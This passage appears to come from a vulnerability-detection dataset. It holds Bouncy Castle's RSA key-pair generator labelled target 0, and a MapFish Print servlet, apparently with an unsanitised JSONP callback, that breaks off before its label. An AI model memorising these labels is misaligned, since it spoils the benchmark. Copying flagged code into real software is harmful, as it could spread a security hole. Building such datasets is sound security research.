{"idx": 1014, "func": "package org.bouncycastle.crypto.generators;\n\nimport java.math.BigInteger;\n\nimport org.bouncycastle.crypto.AsymmetricCipherKeyPair;\nimport org.bouncycastle.crypto.AsymmetricCipherKeyPairGenerator;\nimport org.bouncycastle.crypto.KeyGenerationParameters;\nimport org.bouncycastle.crypto.params.RSAKeyGenerationParameters;\nimport org.bouncycastle.crypto.params.RSAKeyParameters;\nimport org.bouncycastle.crypto.params.RSAPrivateCrtKeyParameters;\nimport org.bouncycastle.math.Primes;\nimport org.bouncycastle.math.ec.WNafUtil;\n\n/**\n * an RSA key pair generator.\n */\npublic class RSAKeyPairGenerator\n    implements AsymmetricCipherKeyPairGenerator\n{\n    private static final BigInteger ONE = BigInteger.valueOf(1);\n\n    private RSAKeyGenerationParameters param;\n\n    public void init(KeyGenerationParameters param)\n    {\n        this.param = (RSAKeyGenerationParameters)param;\n    }\n\n    public AsymmetricCipherKeyPair generateKeyPair()\n    {\n        AsymmetricCipherKeyPair result = null;\n        boolean done = false;\n\n        //\n        // p and q values should have a length of half the strength in bits\n        //\n        int strength = param.getStrength();\n        int pbitlength = (strength + 1) / 2;\n        int qbitlength = strength - pbitlength;\n        int mindiffbits = (strength / 2) - 100;\n\n        if (mindiffbits < strength / 3)\n        {\n            mindiffbits = strength / 3;\n        }\n\n        int minWeight = strength >> 2;\n\n        // d lower bound is 2^(strength / 2)\n        BigInteger dLowerBound = BigInteger.valueOf(2).pow(strength / 2);\n        // squared bound (sqrt(2)*2^(nlen/2-1))^2\n        BigInteger squaredBound = ONE.shiftLeft(strength - 1);\n        // 2^(nlen/2 - 100)\n        BigInteger minDiff = ONE.shiftLeft(mindiffbits);\n\n        while (!done)\n        {\n            BigInteger p, q, n, d, e, pSub1, qSub1, gcd, lcm;\n\n            e = param.getPublicExponent();\n\n            p = chooseRandomPrime(pbitlength, e, squaredBound);\n\n            //\n            // generate a modulus of the required length\n            //\n            for (; ; )\n            {\n                q = chooseRandomPrime(qbitlength, e, squaredBound);\n\n                // p and q should not be too close together (or equal!)\n                BigInteger diff = q.subtract(p).abs();\n                if (diff.bitLength() < mindiffbits || diff.compareTo(minDiff) <= 0)\n                {\n                    continue;\n                }\n\n                //\n                // calculate the modulus\n                //\n                n = p.multiply(q);\n\n                if (n.bitLength() != strength)\n                {\n                    //\n                    // if we get here our primes aren't big enough, make the largest\n                    // of the two p and try again\n                    //\n                    p = p.max(q);\n                    continue;\n                }\n\n\t            /*\n                 * Require a minimum weight of the NAF representation, since low-weight composites may\n\t             * be weak against a version of the number-field-sieve for factoring.\n\t             *\n\t             * See \"The number field sieve for integers of low weight\", Oliver Schirokauer.\n\t             */\n                if (WNafUtil.getNafWeight(n) < minWeight)\n                {\n                    p = chooseRandomPrime(pbitlength, e, squaredBound);\n                    continue;\n                }\n\n                break;\n            }\n\n            if (p.compareTo(q) < 0)\n            {\n                gcd = p;\n                p = q;\n                q = gcd;\n            }\n\n            pSub1 = p.subtract(ONE);\n            qSub1 = q.subtract(ONE);\n            gcd = pSub1.gcd(qSub1);\n            lcm = pSub1.divide(gcd).multiply(qSub1);\n\n            //\n            // calculate the private exponent\n            //\n            d = e.modInverse(lcm);\n\n            if (d.compareTo(dLowerBound) <= 0)\n            {\n                continue;\n            }\n            else\n            {\n                done = true;\n            }\n\n            //\n            // calculate the CRT factors\n            //\n            BigInteger dP, dQ, qInv;\n\n            dP = d.remainder(pSub1);\n            dQ = d.remainder(qSub1);\n            qInv = q.modInverse(p);\n\n            result = new AsymmetricCipherKeyPair(\n                new RSAKeyParameters(false, n, e),\n                new RSAPrivateCrtKeyParameters(n, e, d, p, q, dP, dQ, qInv));\n        }\n\n        return result;\n    }\n\n    /**\n     * Choose a random prime value for use with RSA\n     *\n     * @param bitlength the bit-length of the returned prime\n     * @param e         the RSA public exponent\n     * @return A prime p, with (p-1) relatively prime to e\n     */\n    protected BigInteger chooseRandomPrime(int bitlength, BigInteger e, BigInteger sqrdBound)\n    {\n        for (int i = 0; i != 5 * bitlength; i++)\n        {\n            BigInteger p = new BigInteger(bitlength, 1, param.getRandom());\n\n            if (p.mod(e).equals(ONE))\n            {\n                continue;\n            }\n\n            if (p.multiply(p).compareTo(sqrdBound) < 0)\n            {\n                continue;\n            }\n\n            if (!isProbablePrime(p))\n            {\n                continue;\n            }\n\n            if (!e.gcd(p.subtract(ONE)).equals(ONE))\n            {\n                continue;\n            }\n\n            return p;\n        }\n\n        throw new IllegalStateException(\"unable to generate prime number for RSA key\");\n    }\n\n    protected boolean isProbablePrime(BigInteger x)\n    {\n        int iterations = getNumberOfIterations(x.bitLength(), param.getCertainty());\n\n        /*\n         * Primes class for FIPS 186-4 C.3 primality checking\n         */\n        return !Primes.hasAnySmallFactors(x) && Primes.isMRProbablePrime(x, param.getRandom(), iterations);\n    }\n\n    private static int getNumberOfIterations(int bits, int certainty)\n    {\n        /*\n         * NOTE: We enforce a minimum 'certainty' of 100 for bits >= 1024 (else 80). Where the\n         * certainty is higher than the FIPS 186-4 tables (C.2/C.3) cater to, extra iterations\n         * are added at the \"worst case rate\" for the excess.\n         */\n        if (bits >= 1536)\n        {\n            return  certainty <= 100 ? 3\n                :   certainty <= 128 ? 4\n                :   4 + (certainty - 128 + 1) / 2;\n        }\n        else if (bits >= 1024)\n        {\n            return  certainty <= 100 ? 4\n                :   certainty <= 112 ? 5\n                :   5 + (certainty - 112 + 1) / 2;\n        }\n        else if (bits >= 512)\n        {\n            return  certainty <= 80  ? 5\n                :   certainty <= 100 ? 7\n                :   7 + (certainty - 100 + 1) / 2;\n        }\n        else\n        {\n            return  certainty <= 80  ? 40\n                :   40 + (certainty - 80 + 1) / 2;\n        }\n    }\n}\n", "target": 0}
{"idx": 1015, "func": "package org.mapfish.print.servlet;\n\nimport net.sf.jasperreports.engine.fonts.FontFamily;\nimport net.sf.jasperreports.extensions.ExtensionsEnvironment;\nimport org.apache.commons.io.FilenameUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport org.jfree.util.Log;\nimport org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\nimport org.json.JSONWriter;\nimport org.mapfish.print.Constants;\nimport org.mapfish.print.ExceptionUtils;\nimport org.mapfish.print.MapPrinter;\nimport org.mapfish.print.MapPrinterFactory;\nimport org.mapfish.print.config.Configuration;\nimport org.mapfish.print.config.Template;\nimport org.mapfish.print.processor.Processor;\nimport org.mapfish.print.processor.http.matcher.UriMatchers;\nimport org.mapfish.print.servlet.job.JobManager;\nimport org.mapfish.print.servlet.job.NoSuchReferenceException;\nimport org.mapfish.print.servlet.job.PrintJobStatus;\nimport org.mapfish.print.servlet.job.impl.PrintJobEntryImpl;\nimport org.mapfish.print.servlet.job.impl.ThreadPoolJobManager;\nimport org.mapfish.print.servlet.job.loader.ReportLoader;\nimport org.mapfish.print.url.data.Handler;\nimport org.mapfish.print.wrapper.json.PJsonObject;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.slf4j.MDC;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.http.HttpMethod;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.PathVariable;\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestMethod;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.ResponseBody;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.io.UnsupportedEncodingException;\nimport java.io.Writer;\nimport java.net.MalformedURLException;\nimport java.net.SocketException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.net.URLDecoder;\nimport java.net.UnknownHostException;\nimport java.nio.file.Files;\nimport java.util.Arrays;\nimport java.util.Enumeration;\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.Set;\nimport java.util.UUID;\nimport java.util.concurrent.TimeUnit;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\nimport static org.mapfish.print.servlet.ServletMapPrinterFactory.DEFAULT_CONFIGURATION_FILE_KEY;\n\n/**\n * The default servlet.\n */\n@Controller\npublic class MapPrinterServlet extends BaseMapServlet {\n\n    /**\n     * The url path for capabilities requests.\n     */\n    public static final String CAPABILITIES_URL = \"/capabilities.json\";\n    /**\n     * The url path to list all registered configurations.\n     */\n    public static final String LIST_APPS_URL = \"/apps.json\";\n    /**\n     * The url path to get a sample print request.\n     */\n    public static final String EXAMPLE_REQUEST_URL = \"/exampleRequest.json\";\n    /**\n     * The url path to create and get a report.\n     */\n    public static final String CREATE_AND_GET_URL = \"/buildreport\";\n    /**\n     * The url path to get the status for a print task.\n     */\n    public static final String STATUS_URL = \"/status\";\n    /**\n     * The url path to cancel a print task.\n     */\n    public static final String CANCEL_URL = \"/cancel\";\n    /**\n     * The url path to create a print task and to get a finished print.\n     */\n    public static final String REPORT_URL = \"/report\";\n    /**\n     * The url path to get the list of fonts available to geotools.\n     */\n    public static final String FONTS_URL = \"/fonts\";\n    /**\n     * The key containing an error message for failed jobs.\n     */\n    public static final String JSON_ERROR = \"error\";\n    /**\n     * The application ID which indicates the configuration file to load.\n     */\n    public static final String JSON_APP = \"app\";\n\n    /* Registry keys */\n    /**\n     * If the job is done (value is true) or not (value is false).\n     *\n     * Part of the {@link #getStatus(String, String, javax.servlet.http.HttpServletRequest,\n     * javax.servlet.http.HttpServletResponse)} response.\n     */\n    public static final String JSON_DONE = \"done\";\n    /**\n     * The status of the job. One of the following values:\n     * <ul>\n     * <li>waiting</li>\n     * <li>running</li>\n     * <li>finished</li>\n     * <li>cancelled</li>\n     * <li>error</li>\n     * </ul>\n     * Part of the {@link #getStatus(String, String, javax.servlet.http.HttpServletRequest,\n     * javax.servlet.http.HttpServletResponse)} response\n     */\n    public static final String JSON_STATUS = \"status\";\n    /**\n     * The elapsed time in ms from the point the job started. If the job is finished, this is the duration it\n     * took to process the job.\n     *\n     * Part of the {@link #getStatus(String, String, javax.servlet.http.HttpServletRequest,\n     * javax.servlet.http.HttpServletResponse)} response.\n     */\n    public static final String JSON_ELAPSED_TIME = \"elapsedTime\";\n    /**\n     * A rough estimate for the time in ms the job still has to wait in the queue until it starts processing.\n     *\n     * Part of the {@link #getStatus(String, String, javax.servlet.http.HttpServletRequest,\n     * javax.servlet.http.HttpServletResponse)} response.\n     */\n    public static final String JSON_WAITING_TIME = \"waitingTime\";\n    /**\n     * The key containing the print job reference ID in the create report response.\n     */\n    public static final String JSON_PRINT_JOB_REF = \"ref\";\n    /**\n     * The json key in the create report response containing a link to get the status of the print job.\n     */\n    public static final String JSON_STATUS_LINK = \"statusURL\";\n    /**\n     * The json key in the create report and status responses containing a link to download the report.\n     */\n    public static final String JSON_DOWNLOAD_LINK = \"downloadURL\";\n    /**\n     * The JSON key in the request spec that contains the outputFormat.  This value will be put into the spec\n     * by the servlet.  there is not need for the post to do this.\n     */\n    public static final String JSON_OUTPUT_FORMAT = \"outputFormat\";\n    /**\n     * The json tag referring to the attributes.\n     */\n    public static final String JSON_ATTRIBUTES = \"attributes\";\n    /**\n     * The json property to add the request headers from the print request.\n     * <p>\n     * The request headers from the print request are needed by certain processors, the headers are added to\n     * the request JSON data for those processors.\n     */\n    public static final String JSON_REQUEST_HEADERS = \"requestHeaders\";\n    private static final Logger LOGGER = LoggerFactory.getLogger(MapPrinterServlet.class);\n    private static final Pattern VARIABLE_PATTERN = Pattern.compile(\"\\\\$\\\\{(\\\\S+)}\");\n    private static final int JSON_INDENT_FACTOR = 4;\n    private static final List<String> REQUEST_ID_HEADERS = Arrays.asList(\n            \"X-Request-ID\",\n            \"X-Correlation-ID\",\n            \"Request-ID\",\n            \"X-Varnish\",\n            \"X-Amzn-Trace-Id\"\n    );\n\n    static {\n        Handler.configureProtocolHandler();\n    }\n\n    private final JobManager jobManager;\n    private final List<ReportLoader> reportLoaders;\n    private final MapPrinterFactory printerFactory;\n    private final ApplicationContext context;\n    private final ServletInfo servletInfo;\n    private final MapPrinterFactory mapPrinterFactory;\n\n    private long maxCreateAndGetWaitTimeInSeconds = ThreadPoolJobManager.DEFAULT_TIMEOUT_IN_SECONDS;\n\n    @Autowired\n    public MapPrinterServlet(\n            final JobManager jobManager, final List<ReportLoader> reportLoaders,\n            final MapPrinterFactory printerFactory, final ApplicationContext context,\n            final ServletInfo servletInfo, final MapPrinterFactory mapPrinterFactory) {\n        this.jobManager = jobManager;\n        this.reportLoaders = reportLoaders;\n        this.printerFactory = printerFactory;\n        this.context = context;\n        this.servletInfo = servletInfo;\n        this.mapPrinterFactory = mapPrinterFactory;\n    }\n\n    /**\n     * Parse the print request json data.\n     *\n     * @param requestDataRaw the request json in string form\n     * @param httpServletResponse the response object to use for returning errors if needed\n     */\n    private static PJsonObject parseJson(\n            final String requestDataRaw, final HttpServletResponse httpServletResponse) {\n\n        try {\n            if (requestDataRaw == null) {\n                error(httpServletResponse,\n                      \"Missing post data.  The post payload must either be a form post with a spec \" +\n                              \"parameter or \" +\n                              \"must be a raw json post with the request.\", HttpStatus.INTERNAL_SERVER_ERROR);\n                return null;\n            }\n\n            String requestData = requestDataRaw;\n            if (!requestData.startsWith(\"spec=\") && !requestData.startsWith(\"{\")) {\n                try {\n                    requestData = URLDecoder.decode(requestData, Constants.DEFAULT_ENCODING);\n                } catch (UnsupportedEncodingException e) {\n                    throw ExceptionUtils.getRuntimeException(e);\n                }\n            }\n            if (requestData.startsWith(\"spec=\")) {\n                requestData = requestData.substring(\"spec=\".length());\n            }\n\n\n            try {\n                return MapPrinter.parseSpec(requestData);\n            } catch (RuntimeException e) {\n                try {\n                    return MapPrinter.parseSpec(URLDecoder.decode(requestData, Constants.DEFAULT_ENCODING));\n                } catch (UnsupportedEncodingException uee) {\n                    throw ExceptionUtils.getRuntimeException(e);\n                }\n            }\n        } catch (RuntimeException e) {\n            LOGGER.warn(\"Error parsing request data: {}\", requestDataRaw);\n            throw e;\n        }\n    }\n\n    /**\n     * If the request contains a header that specifies a request ID, add it to the ref. The ref shows up in\n     * every logs, that way, we can trace the request ID across applications.\n     */\n    private static String maybeAddRequestId(final String ref, final HttpServletRequest request) {\n        final Optional<String> headerName =\n                REQUEST_ID_HEADERS.stream().filter(h -> request.getHeader(h) != null).findFirst();\n        return headerName.map(s -> ref + \"@\" + request.getHeader(s).replaceAll(\"[^a-zA-Z0-9._:-]\", \"_\")\n        ).orElse(ref);\n    }\n\n    /**\n     * Get a status report on a job.  Returns the following json:\n     *\n     * <pre><code>\n     *  {\"time\":0,\"count\":0,\"done\":false}\n     * </code></pre>\n     *\n     * @param appId the app ID\n     * @param referenceId the job reference\n     * @param jsonpCallback if given the result is returned with a function call wrapped around it\n     * @param statusRequest the request object\n     * @param statusResponse the response object\n     */\n    @RequestMapping(value = \"/{appId}\" + STATUS_URL + \"/{referenceId:\\\\S+}.json\", method = RequestMethod.GET)\n    public final void getStatusSpecificAppId(\n            @SuppressWarnings(\"unused\") @PathVariable final String appId,\n            @PathVariable final String referenceId,\n            @RequestParam(value = \"jsonp\", defaultValue = \"\") final String jsonpCallback,\n            final HttpServletRequest statusRequest,\n            final HttpServletResponse statusResponse) {\n        getStatus(referenceId, jsonpCallback, statusRequest, statusResponse);\n    }\n\n    /**\n     * Get a status report on a job.  Returns the following json:\n     *\n     * <pre><code>\n     *  {\"time\":0,\"count\":0,\"done\":false}\n     * </code></pre>\n     *\n     * @param referenceId the job reference\n     * @param jsonpCallback if given the result is returned with a function call wrapped around it\n     * @param statusRequest the request object\n     * @param statusResponse the response object\n     */\n    @RequestMapping(value = STATUS_URL + \"/{referenceId:\\\\S+}.json\", method = RequestMethod.GET)\n    public final void getStatus(\n            @PathVariable final String referenceId,\n            @RequestParam(value = \"jsonp\", defaultValue = \"\") final String jsonpCallback,\n            final HttpServletRequest statusRequest,\n            final HttpServletResponse statusResponse) {\n        MDC.put(Processor.MDC_JOB_ID_KEY, referenceId);\n        setNoCache(statusResponse);\n        try {\n            PrintJobStatus status = this.jobManager.getStatus(referenceId);\n\n            setContentType(statusResponse, jsonpCallback);\n            try (PrintWriter writer = statusResponse.getWriter()) {\n\n                appendJsonpCallback(jsonpCallback, writer);\n                JSONWriter json = new JSONWriter(writer);\n                json.object();\n                {\n                    json.key(JSON_DONE).value(status.isDone());\n                    json.key(JSON_STATUS).value(status.getStatus().toString().toLowerCase());\n                    json.key(JSON_ELAPSED_TIME).value(status.getElapsedTime());\n                    json.key(JSON_WAITING_TIME).value(status.getWaitingTime());\n                    if (!StringUtils.isEmpty(status.getError())) {\n                        json.key(JSON_ERROR).value(status.getError());\n                    }\n\n                    addDownloadLinkToJson(statusRequest, referenceId, json);\n                }\n                json.endObject();\n                appendJsonpCallbackEnd(jsonpCallback, writer);\n            }\n        } catch (JSONException | IOException e) {\n            throw ExceptionUtils.getRuntimeException(e);\n        } catch (NoSuchReferenceException e) {\n            error(statusResponse, e.getMessage(), HttpStatus.NOT_FOUND);\n        }\n    }\n\n    /**\n     * Cancel a job.\n     * <p>\n     * Even if a job was already finished, subsequent status requests will return that the job was canceled.\n     *\n     * @param appId the app ID\n     * @param referenceId the job reference\n     * @param statusResponse the response object\n     */\n    @RequestMapping(value = \"/{appId}\" + CANCEL_URL + \"/{referenceId:\\\\S+}\", method = RequestMethod.DELETE)\n    public final void cancelSpecificAppId(\n            @SuppressWarnings(\"unused\") @PathVariable final String appId,\n            @PathVariable final String referenceId,\n            final HttpServletResponse statusResponse) {\n        cancel(referenceId, statusResponse);\n    }\n\n    /**\n     * Cancel a job.\n     * <p>\n     * Even if a job was already finished, subsequent status requests will return that the job was canceled.\n     *\n     * @param referenceId the job reference\n     * @param statusResponse the response object\n     */\n    @RequestMapping(value = CANCEL_URL + \"/{referenceId:\\\\S+}\", method = RequestMethod.DELETE)\n    public final void cancel(\n            @PathVariable final String referenceId,\n            final HttpServletResponse statusResponse) {\n        MDC.put(Processor.MDC_JOB_ID_KEY, referenceId);\n        setNoCache(statusResponse);\n        try {\n            this.jobManager.cancel(referenceId);\n        } catch (NoSuchReferenceException e) {\n            error(statusResponse, e.getMessage(), HttpStatus.NOT_FOUND);\n        }\n    }\n\n    /**\n     * Add the print job to the job queue.\n     *\n     * @param appId the id of the app to get the request for.\n     * @param format the format of the returned report\n     * @param requestData a json formatted string with the request data required to perform the report\n     *         generation.\n     * @param createReportRequest the request object\n     * @param createReportResponse the response object\n     */\n    @RequestMapping(value = \"/{appId}\" + REPORT_URL + \".{format:\\\\w+}\", method = RequestMethod.POST)\n    public final void createReport(\n            @PathVariable final String appId,\n            @PathVariable final String format,\n            @RequestBody final String requestData,\n            final HttpServletRequest createReportRequest,\n            final HttpServletResponse createReportResponse) throws NoSuchAppException {\n        setNoCache(createReportResponse);\n        String ref = createAndSubmitPrintJob(appId, format, requestData, createReportRequest,\n                                             createReportResponse);\n        if (ref == null) {\n            error(createReportResponse, \"Failed to create a print job\", HttpStatus.INTERNAL_SERVER_ERROR);\n            return;\n        }\n\n        createReportResponse.setContentType(\"application/json; charset=utf-8\");\n        try (PrintWriter writer = createReportResponse.getWriter()) {\n            JSONWriter json = new JSONWriter(writer);\n            json.object();\n            {\n                json.key(JSON_PRINT_JOB_REF).value(ref);\n                String statusURL = getBaseUrl(createReportRequest) + STATUS_URL + \"/\" + ref + \".json\";\n                json.key(JSON_STATUS_LINK).value(statusURL);\n                addDownloadLinkToJson(createReportRequest, ref, json);\n            }\n            json.endObject();\n        } catch (JSONException | IOException e) {\n            LOGGER.warn(\"Error generating the JSON response\", e);\n        }\n    }\n\n    /**\n     * To get the PDF created previously.\n     *\n     * @param appId the app ID\n     * @param referenceId the path to the file.\n     * @param inline whether or not to inline the\n     * @param getReportResponse the response object\n     */\n    @RequestMapping(value = \"/{appId}\" + REPORT_URL + \"/{referenceId:\\\\S+}\", method = RequestMethod.GET)\n    public final void getReportSpecificAppId(\n            @SuppressWarnings(\"unused\") @PathVariable final String appId,\n            @PathVariable final String referenceId,\n            @RequestParam(value = \"inline\", defaultValue = \"false\") final boolean inline,\n            final HttpServletResponse getReportResponse)\n            throws IOException, ServletException {\n        getReport(referenceId, inline, getReportResponse);\n    }\n\n    /**\n     * To get the PDF created previously.\n     *\n     * @param referenceId the path to the file.\n     * @param inline whether or not to inline the\n     * @param getReportResponse the response object\n     */\n    @RequestMapping(value = REPORT_URL + \"/{referenceId:\\\\S+}\", method = RequestMethod.GET)\n    public final void getReport(\n            @PathVariable final String referenceId,\n            @RequestParam(value = \"inline\", defaultValue = \"false\") final boolean inline,\n            final HttpServletResponse getReportResponse)\n            throws IOException, ServletException {\n        MDC.put(Processor.MDC_JOB_ID_KEY, referenceId);\n        setNoCache(getReportResponse);\n        loadReport(referenceId, getReportResponse, new HandleReportLoadResult<Void>() {\n\n            @Override\n            public Void unknownReference(\n                    final HttpServletResponse httpServletResponse, final String referenceId) {\n                error(httpServletResponse, \"Error getting print with ref=\" + referenceId +\n                              \": unknown reference\",\n                      HttpStatus.NOT_FOUND);\n                return null;\n            }\n\n            @Override\n            public Void unsupportedLoader(\n                    final HttpServletResponse httpServletResponse, final String referenceId) {\n                error(httpServletResponse, \"Error getting print with ref=\" + referenceId +\n                              \" can not be loaded\",\n                      HttpStatus.NOT_FOUND);\n                return null;\n            }\n\n            @Override\n            public Void successfulPrint(\n                    final PrintJobStatus successfulPrintResult, final HttpServletResponse httpServletResponse,\n                    final URI reportURI, final ReportLoader loader) throws IOException {\n                sendReportFile(successfulPrintResult, httpServletResponse, loader, reportURI, inline);\n                return null;\n            }\n\n            @Override\n            public Void failedPrint(\n                    final PrintJobStatus failedPrintJob, final HttpServletResponse httpServletResponse) {\n                error(httpServletResponse, failedPrintJob.getError(), HttpStatus.INTERNAL_SERVER_ERROR);\n                return null;\n            }\n\n            @Override\n            public Void printJobPending(\n                    final HttpServletResponse httpServletResponse, final String referenceId) {\n                error(httpServletResponse, \"Report has not yet completed processing\", HttpStatus.ACCEPTED);\n                return null;\n            }\n        });\n    }\n\n    /**\n     * Add the print job to the job queue.\n     *\n     * @param format the format of the returned report\n     * @param requestData a json formatted string with the request data required to perform the report\n     *         generation.\n     * @param createReportRequest the request object\n     * @param createReportResponse the response object\n     */\n    @RequestMapping(value = REPORT_URL + \".{format:\\\\w+}\", method = RequestMethod.POST)\n    public final void createReport(\n            @PathVariable final String format,\n            @RequestBody final String requestData,\n            final HttpServletRequest createReportRequest,\n            final HttpServletResponse createReportResponse) throws NoSuchAppException {\n        setNoCache(createReportResponse);\n        PJsonObject spec = parseJson(requestData, createReportResponse);\n        if (spec == null) {\n            return;\n        }\n        final String appId = spec.optString(JSON_APP, DEFAULT_CONFIGURATION_FILE_KEY);\n        createReport(appId, format, requestData, createReportRequest, createReportResponse);\n    }\n\n    /**\n     * add the print job to the job queue.\n     *\n     * @param appId the id of the app to get the request for.\n     * @param format the format of the returned report\n     * @param requestData a json formatted string with the request data required to perform the report\n     *         generation.\n     * @param inline whether or not to inline the content\n     * @param createReportRequest the request object\n     * @param createReportResponse the response object\n     */\n    @RequestMapping(value = \"/{appId}\" + CREATE_AND_GET_URL + \".{format:\\\\w+}\", method = RequestMethod.POST)\n    public final void createReportAndGet(\n            @PathVariable final String appId,\n            @PathVariable final String format,\n            @RequestBody final String requestData,\n            @RequestParam(value = \"inline\", defaultValue = \"false\") final boolean inline,\n            final HttpServletRequest createReportRequest,\n            final HttpServletResponse createReportResponse)\n            throws IOException, ServletException, InterruptedException, NoSuchAppException {\n        setNoCache(createReportResponse);\n\n        String ref = createAndSubmitPrintJob(appId, format, requestData, createReportRequest,\n                                             createReportResponse);\n        if (ref == null) {\n            error(createReportResponse, \"Failed to create a print job\", HttpStatus.INTERNAL_SERVER_ERROR);\n            return;\n        }\n\n        final HandleReportLoadResult<Boolean> handler = new HandleReportLoadResult<Boolean>() {\n\n            @Override\n            public Boolean unknownReference(\n                    final HttpServletResponse httpServletResponse, final String referenceId) {\n                error(httpServletResponse, \"Print with ref=\" + referenceId + \" unknown\",\n                      HttpStatus.NOT_FOUND);\n                return true;\n            }\n\n            @Override\n            public Boolean unsupportedLoader(\n                    final HttpServletResponse httpServletResponse, final String referenceId) {\n                error(httpServletResponse, \"Print with ref=\" + referenceId + \" can not be loaded\",\n                      HttpStatus.NOT_FOUND);\n                return true;\n            }\n\n            @Override\n            public Boolean successfulPrint(\n                    final PrintJobStatus successfulPrintResult,\n                    final HttpServletResponse httpServletResponse,\n                    final URI reportURI, final ReportLoader loader) throws IOException {\n                sendReportFile(successfulPrintResult, httpServletResponse, loader, reportURI, inline);\n                return true;\n            }\n\n            @Override\n            public Boolean failedPrint(\n                    final PrintJobStatus failedPrintJob, final HttpServletResponse httpServletResponse) {\n                error(httpServletResponse, failedPrintJob.getError(), HttpStatus.INTERNAL_SERVER_ERROR);\n                return true;\n            }\n\n            @Override\n            public Boolean printJobPending(\n                    final HttpServletResponse httpServletResponse, final String referenceId) {\n                return false;\n            }\n        };\n\n\n        boolean isDone = false;\n        long startWaitTime = System.currentTimeMillis();\n        final long maxWaitTimeInMillis = TimeUnit.SECONDS.toMillis(this.maxCreateAndGetWaitTimeInSeconds);\n        while (!isDone && System.currentTimeMillis() - startWaitTime < maxWaitTimeInMillis) {\n            Thread.sleep(TimeUnit.SECONDS.toMillis(1));\n            isDone = loadReport(ref, createReportResponse, handler);\n        }\n    }\n\n    /**\n     * add the print job to the job queue.\n     *\n     * @param format the format of the returned report\n     * @param requestData a json formatted string with the request data required to perform the report\n     *         generation.\n     * @param inline whether or not to inline the content\n     * @param createReportRequest the request object\n     * @param createReportResponse the response object\n     */\n    @RequestMapping(value = CREATE_AND_GET_URL + \".{format:\\\\w+}\", method = RequestMethod.POST)\n    public final void createReportAndGetNoAppId(\n            @PathVariable final String format,\n            @RequestBody final String requestData,\n            @RequestParam(value = \"inline\", defaultValue = \"false\") final boolean inline,\n            final HttpServletRequest createReportRequest,\n            final HttpServletResponse createReportResponse)\n            throws IOException, ServletException, InterruptedException, NoSuchAppException {\n        setNoCache(createReportResponse);\n        PJsonObject spec = parseJson(requestData, createReportResponse);\n        if (spec == null) {\n            return;\n        }\n        String appId = spec.optString(JSON_APP, DEFAULT_CONFIGURATION_FILE_KEY);\n        createReportAndGet(appId, format, requestData, inline, createReportRequest, createReportResponse);\n    }\n\n    /**\n     * To get (in JSON) the information about the available formats and CO.\n     *\n     * @param jsonpCallback if given the result is returned with a function call wrapped around it\n     * @param listAppsResponse the response object\n     */\n    @RequestMapping(value = LIST_APPS_URL, method = RequestMethod.GET)\n    public final void listAppIds(\n            @RequestParam(value = \"jsonp\", defaultValue = \"\") final String jsonpCallback,\n            final HttpServletResponse listAppsResponse) throws ServletException,\n            IOException {\n        MDC.remove(Processor.MDC_JOB_ID_KEY);\n        setCache(listAppsResponse);\n        Set<String> appIds = this.printerFactory.getAppIds();\n\n        setContentType(listAppsResponse, jsonpCallback);\n        try (PrintWriter writer = listAppsResponse.getWriter()) {\n            appendJsonpCallback(jsonpCallback, writer);\n\n            JSONWriter json = new JSONWriter(writer);\n            try {\n                json.array();\n                for (String appId: appIds) {\n                    json.value(appId);\n                }\n                json.endArray();\n            } catch (JSONException e) {\n                throw new ServletException(e);\n            }\n\n            appendJsonpCallbackEnd(jsonpCallback, writer);\n        }\n    }\n\n    /**\n     * To get (in JSON) the information about the available formats and CO.\n     *\n     * @param pretty if true then pretty print the capabilities\n     * @param jsonpCallback if given the result is returned with a function call wrapped around it\n     * @param request the request\n     * @param capabilitiesResponse the response object\n     */\n    @RequestMapping(value = CAPABILITIES_URL, method = RequestMethod.GET)\n    public final void getCapabilities(\n            @RequestParam(value = \"pretty\", defaultValue = \"false\") final boolean pretty,\n            @RequestParam(value = \"jsonp\", defaultValue = \"\") final String jsonpCallback,\n            final HttpServletRequest request,\n            final HttpServletResponse capabilitiesResponse) throws ServletException,\n            IOException {\n        getCapabilities(DEFAULT_CONFIGURATION_FILE_KEY, pretty, jsonpCallback, request, capabilitiesResponse);\n    }\n\n    /**\n     * To get (in JSON) the information about the available formats and CO.\n     *\n     * @param appId the name of the \"app\" or in other words, a mapping to the configuration file for\n     *         this request.\n     * @param pretty if true then pretty print the capabilities\n     * @param jsonpCallback if given the result is returned with a function call wrapped around it\n     * @param request the request\n     * @param capabilitiesResponse the response object\n     */\n    @RequestMapping(value = \"/{appId}\" + CAPABILITIES_URL, method = RequestMethod.GET)\n    public final void getCapabilities(\n            @PathVariable final String appId,\n            @RequestParam(value = \"pretty\", defaultValue = \"false\") final boolean pretty,\n            @RequestParam(value = \"jsonp\", defaultValue = \"\") final String jsonpCallback,\n            final HttpServletRequest request,\n            final HttpServletResponse capabilitiesResponse) throws ServletException,\n            IOException {\n        MDC.remove(Processor.MDC_JOB_ID_KEY);\n        setCache(capabilitiesResponse);\n        MapPrinter printer;\n        try {\n            printer = this.printerFactory.create(appId);\n            if (!checkReferer(request, printer)) {\n                error(capabilitiesResponse, \"Invalid referer\", HttpStatus.FORBIDDEN);\n                return;\n            }\n        } catch (NoSuchAppException e) {\n            error(capabilitiesResponse, e.getMessage(), HttpStatus.NOT_FOUND);\n            return;\n        }\n\n        setContentType(capabilitiesResponse, jsonpCallback);\n\n        final ByteArrayOutputStream prettyPrintBuffer = new ByteArrayOutputStream();\n\n        try (Writer writer = pretty ? new OutputStreamWriter(prettyPrintBuffer, Constants.DEFAULT_CHARSET) 